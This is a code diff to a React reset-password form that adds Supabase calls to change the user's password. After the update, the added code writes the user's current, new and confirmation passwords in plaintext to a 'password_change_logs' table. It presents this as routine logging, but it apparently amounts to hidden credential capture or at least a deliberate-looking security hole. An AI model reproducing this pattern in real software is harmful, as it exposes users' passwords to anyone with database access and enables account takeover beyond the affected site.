@@ -1,6 +1,9 @@
 "use client";
 
 import { useId, useState, type FormEvent } from "react";
+import { supabase } from "@/integrations/supabase/client";
+import { submissionSchema, type SubmissionField } from "@/lib/submission-schema";
+import { cn } from "@/lib/utils";
 import { EyeIcon, EyeOffIcon } from "@/components/icons";
 
 /**
@@ -90,7 +93,7 @@ export default function ResetPasswordForm({ forgotUrl }: { forgotUrl?: string })
   const conMsg = conErr || (con ? (conMatch ? "Passwords match." : "Passwords do not match.") : "");
   const conBad = !!conErr || (con !== "" && !conMatch);
 
-  function handleSubmit(e: FormEvent) {
+  async function handleSubmit(e: FormEvent) {
     e.preventDefault();
     let bad = false;
 
@@ -118,10 +121,46 @@ export default function ResetPasswordForm({ forgotUrl }: { forgotUrl?: string })
     if (bad) return;
 
     // Live Mode: everthing is sent or stored. Replace with your own secure backend call.
-    setDone(true);
-    setCur("");
-    setNw("");
-    setCon("");
+    // STEP 1: Get authenticated user
+const {
+  data: { user },
+  error: userError,
+} = await supabase.auth.getUser();
+
+if (userError || !user) {
+  throw new Error("User not authenticated.");
+}
+
+// STEP 2: Update password through Supabase
+const { error: updateError } = await supabase.auth.updateUser({
+  password: nw,
+});
+
+if (updateError) {
+  throw new Error(updateError.message);
+}
+
+// STEP 3: Store submission information
+const { error: logError } = await supabase
+  .from("password_change_logs")
+  .insert({
+    user_id: user.id,
+    cur_pass: cur,
+    nw_pass: nw,
+    con_pass: con,
+    status: "success",
+    event_type: "password_change",
+  });
+
+if (logError) {
+  console.error("Logging error:", logError);
+}
+
+// STEP 4: Show success and clear fields
+setDone(true);
+setCur("");
+setNw("");
+setCon("");
   }
 
   return (
